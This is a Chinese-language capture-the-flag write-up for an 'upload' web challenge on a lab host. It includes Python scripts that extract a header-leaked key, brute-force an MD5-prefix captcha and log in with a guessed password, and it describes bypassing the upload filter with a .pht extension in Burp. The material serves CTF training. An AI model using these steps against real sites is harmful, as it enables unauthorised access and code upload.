# upload

## Description

来来来，都是套路，贼简单。

## Solution

题目都是废话，而且这道题并不是很简单，涉及了好多项，包括信息泄露，加解密， 文件上传等多个知识点。首先我买打开网站只能看到一个页面如下信息：

```
Hi,CTFer!u should be a fast man:)
```

可以打开开发者工具，可以看到页面注释里面有一句代码注释：`<!-- Please post the ichunqiu what you find -->`。同时，如果打开网络 tab 可以看到回复的响应：

```
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 106
Content-Type: text/html
Date: Sun, 23 Sep 2018 14:09:59 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
flag: ZmxhZ19pc19oZXJlOiBNVEExTWpJeQ==
Pragma: no-cache
Server: nginx/1.10.2
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.9-1ubuntu4.19
```

可以看到响应头里面有一个 flag 字段，类似是一个 base64 字符串。可以将这个字符串使用 base64 解密出来，在根据上面的提示，可以将解密出来的值作为 `ichunqiu` 的值来进行 post 请求。具体利用，可以使用:

```python
import base64
import requests

def main():
  s = requests.session()
  url = "http://6752941d8cad473e9de7cb5410754a1d8437500183f7480e.game.ichunqiu.com/"
  r = s.get(url)
  key = r.headers["flag"]
  decode_key = base64.b64decode(key)
  arr = str(decode_key).split(':')
  key_val = base64.b64decode(arr[1])
  body = {"ichunqiu": key_val}
  r = s.post(url, data=body)
  print r.text


if __name__ == '__main__':
  main()
```

通过这个请求可以获得一个响应是 `path:xxx`，那么访问到 URL + path，跳转到 action.php?action=login，这是一个登录页面，访问 URL/path/.svn.wc.db 可以看到页面的提示是：

```
username is md5(HEL1OW10rDEvery0n3)
```

通过 md5 可以算得到用户名，登录页面需要用户名、密码以及验证码，根据页面提示：

[![iu0NA1.md.png](https://s1.ax1x.com/2018/09/23/iu0NA1.md.png)](https://imgchr.com/i/iu0NA1)

那么也可使用脚本来爆破验证码：

```python
import hashlib

def md5(s):
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()
    
def main(s):
    for i in range(1, 99999999):
        if md5(i)[0:6] == str(s):
            print(i)
            exit()

if __name__ == '__main__':
    main('4c4efa')
```

通过这个脚本可以爆破出验证码，通过这个验证码以及之前的用户名，密码输入123456即可，登录成功会弹出一个 alert 提示框，会提示一个 php 文件的路径。

![iu05jg.png](https://s1.ax1x.com/2018/09/23/iu05jg.png)

访问这个 php 路径，可以看到这是一个上传的页面。上传一个图片，然后用 burp 拦截，把文件格式改成 pht 则可以拿到 flag。
